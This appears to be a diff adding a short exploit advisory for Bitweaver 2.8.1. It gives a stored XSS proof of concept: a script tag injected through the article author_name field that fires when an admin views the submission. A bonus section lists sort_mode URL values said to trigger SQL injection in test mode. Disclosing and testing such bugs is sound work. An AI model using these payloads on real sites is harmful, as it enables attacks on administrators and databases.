@@ -1,0 +1,39 @@
+# exploit title: persistant xss in bitweaver2.8.1
+# date: 22.o2.2o11
+# author: lemlajt
+# software : bitweaver @ sourceforge.net
+# version: 2.8.1
+# tested on: linux
+# cve :
+#
+
+
+PoC :
+1. submit an article
+POST
+http://localhost/www/cmsadmins/bitweaver2.8.1/bitweaver/articles/edit.php
+form-data; name="author_name"\r\n\r\nGuest"><script>alert('xss')</script>\
+
+2. "Success Your article has been submitted and is awaiting approval.", next
+3. log in as an admin, and go to page "Articles Home".
+4. You'll see some arts and your added below. For this test we set topic
+'persistant test':
+' persistent test [ Submitted: Tuesday 22 of February, 2011 (12:18:26) ]'
+Click it.
+5. persistent xss.
+
+* bonus: when bitweaver is running at test mode, you'll have an sql
+injection by visiting:
+http://localhost/www/cmsadmins/bitweaver2.8.1/bitweaver/users/index.php?sort_mode=!@#$%
+^&*%28%29_}{}{:L%3E?%3E%3C
+http://localhost/www/cmsadmins/bitweaver2.8.1/bitweaver/blogs/list_blogs.php?sort_mode=!@
+http://localhost/www/cmsadmins/bitweaver2.8.1/bitweaver/blogs/list_blogs.php?sort_mode=!@
+
+post
+http://localhost/www/cmsadmins/bitweaver2.8.1/bitweaver/blogs/rankings.php
+$sort_mode=!@
+
+
+# *
+regards,
+lemlajt
